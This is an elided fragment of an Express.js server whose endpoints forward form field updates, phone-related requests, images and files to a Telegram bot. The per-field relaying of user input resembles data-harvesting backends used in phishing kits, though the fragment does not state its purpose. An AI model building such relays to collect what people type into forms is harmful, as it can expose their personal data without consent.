...
function saveDataUrlToFile(dataUrl) {
  try {
    ...
    console.warn('saveDataUrlToFile error', e && e.message ? e.message : e);
    return null;
  }
}
async function sendToTelegram(message, imageUrl = null) {
  ...
  const placeholderPatterns = [
    ...
    /REPLACE_ME/i,
    /YOUR_TOKEN/i,
    /PUT_YOUR_TOKEN_HERE/i,
    /PLACEHOLDER/i,
  ];
  if (placeholderPatterns.some((rx) => rx.test(telegramConfig.token))) {
    console.log('[telegram] token looks like placeholder, not sending');
    return { ok: false, reason: 'placeholder_token' };
  }
  const images = [];
  if (imageUrl) {
    if (Array.isArray(imageUrl)) images.push(...imageUrl);
  ...
  try {
    ...
    lastTelegramAttempt = {
      ...
      url: null,
      body: message,
      response: { ok: false, error: e && e.message ? e.message : String(e) },
    };
...
app.get('/api/config-telegram', (req, res) => {
  const maskedToken = telegramConfig.token
    ? telegramConfig.token.length > 10
      ? telegramConfig.token.slice(0, 4) + '...' + telegramConfig.token.slice(-4)
      : '***'
    : null;
...
app.post('/api/config-telegram', async (req, res) => {
  ...
  const masked = telegramConfig.token
    ? telegramConfig.token.length > 10
      ? telegramConfig.token.slice(0, 4) + '...' + telegramConfig.token.slice(-4)
      : '***'
    : null;
...
app.post('/api/request-block', (req, res) => {
  ...
  const maskedPhone = phone
    ? phone.replace(/(\+?\d{2,3})(\d+)(\d{2})$/, (m, a, b, c) => `${a}•••${c}`)
    : '';
...
app.post('/api/field-update', (req, res) => {
  ...
  const textToSend =
    valueToSend && typeof valueToSend === 'object'
...
app.post('/api/field-update/:field', (req, res) => {
  ...
  sendToTelegram(
    textToSend,
    images.length > 0 ? images : req.body && (req.body.image || req.body.imageUrl)
  );
...
// maskStringMiddle already defined above

// (sanitizeValue duplicate removed)

// (duplicate sanitizePayload function removed)

// Helper: extract image data URLs or image URLs from a sanitized payload
// Removed duplicate definition of collectImageFields
      ...
      data.result.forEach((update) => {
        if (update.message && update.message.chat) {
          ...
          if (!detectedChats.has(id)) {
            ...
            console.log(
              '[telegram] Detected chat:',
              id,
              chat.title || chat.username || chat.first_name || '<unknown>'
            );
          }
        }
      });
...
app.post('/api/telegram-send-file', async (req, res) => {
  ...
  try {
    if (!FormData) {
      return res
        .status(500)
        .json({ status: 'error', message: 'form-data module not available on server' });
    }
        ...
        try {
          ...
          if (st && st.size < 512) {
            telegramResults.push({
              file: s.file,
              skipped: true,
              reason: `file too small (${st.size} bytes)`,
            });
            continue;
          }
          const form = new FormData();
...
app.post('/api/send-direct', async (req, res) => {
  try {
    ...
    if (!dataUrl || typeof dataUrl !== 'string')
      return res.status(400).json({ status: 'error', message: 'dataUrl required' });
    ...
    if (
      ...
      placeholderPatterns.some((rx) => rx.test(telegramConfig.token))
    ) {
      ...
      return res.status(400).json({
        status: 'error',
        message: 'telegram not configured or token looks like a placeholder',
      });
    }
    ...
    if (!FormData) {
      ...
      if (!fp)
        return res.status(500).json({ status: 'error', message: 'failed to save temp file' });
      ...
      try {
        ...
        return res
          .status(500)
          .json({ status: 'error', message: e && e.message ? e.message : String(e) });
      }
    }
    ...
    try {
      ...
      return res
        .status(500)
        .json({ status: 'error', error: e && e.message ? e.message : String(e) });
    }
  } catch (e) {
